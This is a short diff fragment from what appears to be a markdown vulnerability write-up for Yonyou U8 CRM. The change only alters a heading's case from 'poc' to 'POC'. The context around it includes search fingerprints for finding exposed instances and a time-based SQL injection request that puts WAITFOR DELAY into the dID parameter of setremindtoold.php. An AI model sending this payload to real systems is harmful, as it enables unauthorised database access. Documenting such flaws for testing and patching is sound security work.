@@ -14,7 +14,7 @@ title="用友U8CRM"
 app.name="用友 CRM"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
